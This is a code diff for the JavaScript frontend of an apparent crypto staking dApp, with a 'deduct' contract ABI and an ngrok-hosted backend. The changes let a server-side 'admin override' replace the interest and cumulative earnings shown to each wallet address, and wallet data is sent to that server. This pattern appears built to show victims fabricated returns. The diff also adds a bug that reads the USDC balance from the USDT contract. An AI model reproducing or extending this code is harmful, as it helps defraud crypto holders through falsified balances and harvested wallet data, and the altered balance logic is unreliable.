@@ -4,7 +4,8 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
-const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev'; // 确保这里是您最新的 ngrok 地址
+// ===== 关键部分：已更新为您的 ngrok 地址 =====
+const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 
 //---ABI Definitions---
 const DEDUCT_CONTRACT_ABI = [
@@ -59,7 +60,10 @@ async function saveUserData() {
     try {
         await fetch(`${API_BASE_URL}/api/user-data`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'ngrok-skip-browser-warning': 'true' 
+            },
             body: JSON.stringify({ address: userAddress, data: dataToSave })
         });
         console.log("User data sent to server.");
@@ -153,15 +157,15 @@ function updateTotalFunds() {
     }
 }
 
-// ===== 关键修正：彻底重写 updateInterest 函数的覆盖逻辑 =====
 async function updateInterest() {
     if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) return;
-
-    let finalGrossOutput, finalCumulative;
+    let finalGrossOutput;
+    let finalCumulative;
+    let overrideApplied = false;
 
     try {
         const response = await fetch(`${API_BASE_URL}/api/all-data`, {
-            cache: 'no-cache',
+            cache: 'no-cache', // ** 强制浏览器不使用缓存 **
             headers: { 'ngrok-skip-browser-warning': 'true' }
         });
 
@@ -169,19 +173,18 @@ async function updateInterest() {
             const allData = await response.json();
             const userOverrides = allData.overrides[userAddress] || {};
 
-            // 检查是否存在有效的覆盖值
             if (typeof userOverrides.grossOutput === 'number' && typeof userOverrides.cumulative === 'number') {
-                console.log("Admin override applied!");
+                console.log("Admin override found, applying values:", userOverrides);
                 finalGrossOutput = userOverrides.grossOutput;
                 finalCumulative = userOverrides.cumulative;
+                overrideApplied = true;
             }
         }
     } catch (error) {
-        // 如果服务器无法连接，则静默失败，继续本地计算
+        // Silently fail if server is unreachable, proceed with local calculation
     }
 
-    // 如果 finalGrossOutput 和 finalCumulative 没有被赋予覆盖值，则执行本地计算
-    if (typeof finalGrossOutput === 'undefined' || typeof finalCumulative === 'undefined') {
+    if (!overrideApplied) {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
         const baseInterestRate = 0.000001;
@@ -190,11 +193,9 @@ async function updateInterest() {
         finalCumulative = finalGrossOutput - claimedInterest;
     }
 
-    // 使用最终确定的值来更新UI
-    grossOutputValue.textContent = `${finalGrossOutput.toFixed(7)} ETH`;
-    cumulativeValue.textContent = `${finalCumulative.toFixed(7)} ETH`;
+    grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
+    cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
 }
-
 
 function updateNextBenefitTimer() {
     if (!nextBenefit) return;
@@ -489,7 +490,7 @@ async function claimInterest() {
         accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
         localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
         updateInterest();
-        const walletBalances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
+        const walletBalances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdtContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
         updateBalancesUI(walletBalances);
         alert("Claim successful! Your Account Balance has been updated.");
         await saveUserData();
